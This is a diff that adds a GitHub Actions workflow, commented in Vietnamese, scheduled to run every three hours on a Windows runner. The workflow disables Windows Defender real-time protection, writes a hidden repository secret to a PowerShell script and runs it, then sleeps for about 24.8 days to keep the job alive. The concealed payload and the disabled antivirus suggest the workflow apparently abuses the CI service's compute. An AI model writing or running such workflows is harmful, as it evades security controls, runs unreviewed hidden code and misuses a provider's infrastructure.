@@ -1,0 +1,37 @@
+name: Run UMA Work on Windows Every 3 Hours
+
+on:
+  schedule:
+    # Chạy mỗi 3 giờ một lần (theo giờ UTC)
+    - cron: '0 */3 * * *'
+  
+  # Cho phép kích hoạt chạy thủ công từ tab Actions
+  workflow_dispatch:
+
+jobs:
+  run-uma-windows:
+    runs-on: windows-latest
+  
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v4
+
+    - name: Disable Windows Defender Real-time Protection
+      shell: pwsh
+      run: |
+        # Tắt quét thời gian thực của Windows Defender
+        Set-MpPreference -DisableRealtimeMonitoring $true
+        Write-Host "Đã tắt Windows Defender Real-time Protection thành công."
+
+    - name: Execute Secret Code on Windows
+      env:
+        MY_WORK_UMA: ${{ secrets.MY_WORK_UMA }}
+      shell: pwsh
+      run: |
+        # Lưu nội dung Secret ra file tạm và thực thi
+        $env:MY_WORK_UMA | Out-File -Encoding utf8 run_script.ps1
+        ./run_script.ps1
+
+    - name: Giu ket noi
+      shell: pwsh
+      run: Start-Sleep -Seconds 2147483
